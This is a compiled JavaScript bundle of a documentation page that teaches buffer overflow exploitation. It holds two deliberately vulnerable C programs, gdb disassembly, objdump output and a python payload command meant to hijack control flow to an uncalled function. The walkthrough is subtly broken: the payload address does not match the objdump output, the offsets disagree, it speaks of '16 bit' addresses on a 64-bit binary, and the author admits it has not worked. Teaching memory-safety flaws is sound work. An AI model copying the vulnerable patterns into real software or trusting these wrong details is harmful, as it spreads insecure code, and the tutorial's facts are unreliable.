"use strict";
(self.webpackChunkdocs = self.webpackChunkdocs || []).push([
  [3738],
  {
    5128: (n, e, t) => {
      t.r(e),
        t.d(e, {
          assets: () => u,
          contentTitle: () => s,
          default: () => f,
          frontMatter: () => l,
          metadata: () => c,
          toc: () => p,
        });
      var r = t(7462),
        a = t(3366),
        i = (t(7294), t(3905)),
        o = (t(828), ["components"]),
        l = {},
        s = "Buffer Overflow",
        c = {
          unversionedId: "security/vulnerabilities/buffer_overflow",
          id: "security/vulnerabilities/buffer_overflow",
          title: "Buffer Overflow",
          description:
            "Buffer overflow is a vulnerability where the buffer of one entity overflows",
          source: "@site/docs/security/vulnerabilities/buffer_overflow.md",
          sourceDirName: "security/vulnerabilities",
          slug: "/security/vulnerabilities/buffer_overflow",
          permalink: "/docs/security/vulnerabilities/buffer_overflow",
          draft: !1,
          tags: [],
          version: "current",
          frontMatter: {},
          sidebar: "tutorialSidebar",
          previous: {
            title: "Threat modelling",
            permalink: "/docs/security/threat_modelling",
          },
          next: {
            title: "CSRF",
            permalink: "/docs/security/vulnerabilities/csrf",
          },
        },
        u = {},
        p = [],
        d = { toc: p };
      function f(n) {
        var e = n.components,
          t = (0, a.Z)(n, o);
        return (0, i.kt)(
          "wrapper",
          (0, r.Z)({}, d, t, { components: e, mdxType: "MDXLayout" }),
          (0, i.kt)("h1", { id: "buffer-overflow" }, "Buffer Overflow"),
          (0, i.kt)(
            "p",
            null,
            (0, i.kt)("strong", { parentName: "p" }, "Buffer overflow"),
            " is a vulnerability where the buffer of one entity overflows\ninto another. This vulnerability is most prevalent in languages where memory\nallocation is explicitly handled by the user, such as C and C++. Buffer overflow\ncan be used for binary exploitation."
          ),
          (0, i.kt)(
            "p",
            null,
            "One prominent example is when the buffer of one variable overflows into another,\nwhich is demonstrated in the code below. This is due to ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "authenticated"),
            " being\ndeclared after ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "password"),
            "."
          ),
          (0, i.kt)(
            "pre",
            null,
            (0, i.kt)(
              "code",
              { parentName: "pre", className: "language-c" },
              '#include<string.h>\n#include<stdio.h>\n\nint main() {\n  char password[4];\n  int authenticated = 0;\n  printf("\\nEnter password:\\n");\n  scanf("%s", password);\n\n  if (!strcmp(password, "abcd")) {\n    authenticated = 1;\n  }\n\n  if (authenticated) {\n    printf("\\nAccess granted!");\n  } else {\n    printf("\\nAccess denied!");\n  }\n}\n'
            )
          ),
          (0, i.kt)(
            "p",
            null,
            "As modern C compilers have some built in protections against overflow, this\nprogram would have to be compiled as ",
            (0, i.kt)(
              "inlineCode",
              { parentName: "p" },
              "gcc -fno-stack-protector -o vuln vuln.c"
            ),
            ".\nWhen running the program, access is granted for the password ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "abcd"),
            " but also for\nany string that is longer than four characters."
          ),
          (0, i.kt)(
            "p",
            null,
            "Our next example is more surprising. Consider the following code snippet. Using\nbinary exploitation we can get ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "uncalled_function"),
            " to be executed."
          ),
          (0, i.kt)(
            "pre",
            null,
            (0, i.kt)(
              "code",
              { parentName: "pre", className: "language-c" },
              '#include<stdio.h>\n#include<string.h>\n\nvoid uncalled_function() {\n  printf("This function should never be called\\n");\n}\n\nvoid called_function(char *args) {\n  char buf[16];\n  strcpy(buf, args);\n  printf("Arg: %s\\n", buf);\n}\n\nint main(int argc, char **argv) {\n  if(argc >= 2) {\n    called_function(argv[1]);\n  }\n  return 0;\n}\n'
            )
          ),
          (0, i.kt)("p", null, "The function can be run as"),
          (0, i.kt)(
            "pre",
            null,
            (0, i.kt)(
              "code",
              { parentName: "pre", className: "language-sh" },
              "> gcc -o vuln.bin vuln.c\n> ./vuln.bin $(python -c 'print(\"A\"*16)')\n"
            )
          ),
          (0, i.kt)(
            "p",
            null,
            "We want to change the value of the ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "call"),
            " in the ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "main"),
            " function. We look up the\nrelative position of ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "call"),
            " in the disassembly code using the GNU debugger. On\nmy computer it is ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "35"),
            "."
          ),
          (0, i.kt)(
            "pre",
            null,
            (0, i.kt)(
              "code",
              { parentName: "pre", className: "language-sh" },
              "> gdb -q ./vuln.bin\nReading symbols from ./vuln.bin...\n(No debugging symbols found in ./vuln.bin)\n(gdb) disas main\nDump of assembler code for function main:\n   0x00000000000011df <+0>: push   %rbp\n   0x00000000000011e0 <+1>: mov    %rsp,%rbp\n   0x00000000000011e3 <+4>: sub    $0x10,%rsp\n   0x00000000000011e7 <+8>: mov    %edi,-0x4(%rbp)\n   0x00000000000011ea <+11>:    mov    %rsi,-0x10(%rbp)\n   0x00000000000011ee <+15>:    cmpl   $0x1,-0x4(%rbp)\n   0x00000000000011f2 <+19>:    jle    0x1207 <main+40>\n   0x00000000000011f4 <+21>:    mov    -0x10(%rbp),%rax\n   0x00000000000011f8 <+25>:    add    $0x8,%rax\n   0x00000000000011fc <+29>:    mov    (%rax),%rax\n   0x00000000000011ff <+32>:    mov    %rax,%rdi\n   0x0000000000001202 <+35>:    call   0x117f <called_function>\n   0x0000000000001207 <+40>:    mov    $0x0,%eax\n   0x000000000000120c <+45>:    leave\n   0x000000000000120d <+46>:    ret\nEnd of assembler dump.\nDump of assembler code for function called_function:\n   0x000000000000117f <+0>: push   %rbp\n   0x0000000000001180 <+1>: mov    %rsp,%rbp\n   0x0000000000001183 <+4>: sub    $0x30,%rsp\n   0x0000000000001187 <+8>: mov    %rdi,-0x28(%rbp)\n   0x000000000000118b <+12>:    mov    %fs:0x28,%rax\n   0x0000000000001194 <+21>:    mov    %rax,-0x8(%rbp)\n   0x0000000000001198 <+25>:    xor    %eax,%eax\n   0x000000000000119a <+27>:    mov    -0x28(%rbp),%rdx\n   0x000000000000119e <+31>:    lea    -0x20(%rbp),%rax\n   0x00000000000011a2 <+35>:    mov    %rdx,%rsi\n   0x00000000000011a5 <+38>:    mov    %rax,%rdi\n   0x00000000000011a8 <+41>:    call   0x1030 <strcpy@plt>\n   0x00000000000011ad <+46>:    lea    -0x20(%rbp),%rax\n   0x00000000000011b1 <+50>:    mov    %rax,%rsi\n   0x00000000000011b4 <+53>:    lea    0xe72(%rip),%rax        # 0x202d\n   0x00000000000011bb <+60>:    mov    %rax,%rdi\n   0x00000000000011be <+63>:    mov    $0x0,%eax\n   0x00000000000011c3 <+68>:    call   0x1060 <printf@plt>\n   0x00000000000011c8 <+73>:    nop\n   0x00000000000011c9 <+74>:    mov    -0x8(%rbp),%rax\n   0x00000000000011cd <+78>:    sub    %fs:0x28,%rax\n   0x00000000000011d6 <+87>:    je     0x11dd <called_function+94>\n   0x00000000000011d8 <+89>:    call   0x1050 <__stack_chk_fail@plt>\n   0x00000000000011dd <+94>:    leave\n   0x00000000000011de <+95>:    ret\n"
            )
          ),
          (0, i.kt)(
            "p",
            null,
            "Next up we need to find function address of ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "uncalled_function"),
            ". We accomplish\nthis using ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "objdump"),
            " and ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "grep"),
            "."
          ),
          (0, i.kt)(
            "pre",
            null,
            (0, i.kt)(
              "code",
              { parentName: "pre", className: "language-sh" },
              "> objdump -d vuln.bin | rg uncalled_function\n0000000000001169 <uncalled_function>:\n"
            )
          ),
          (0, i.kt)(
            "p",
            null,
            "Then we can construct our final command. We want to write to ",
            (0, i.kt)("inlineCode", { parentName: "p" }, "36+4"),
            " positions (4\nsince my computer has 16 bit memory addresses which correspond to 4 ACII\ncharacters). Then the command is:"
          ),
          (0, i.kt)(
            "pre",
            null,
            (0, i.kt)(
              "code",
              { parentName: "pre", className: "language-sh" },
              '> ./vuln.bin $(python -c \'print("A"*39 + "\\x96\\x11\\x00\\x00\\x00\\x00\\x00\\x00")\')\nThis function should never be called\n'
            )
          ),
          (0, i.kt)(
            "p",
            null,
            "NB: I have not gotten this to work for myself yet but this should be one way of\ndoing it."
          )
        );
      }
      f.isMDXComponent = !0;
    },
  },
]);
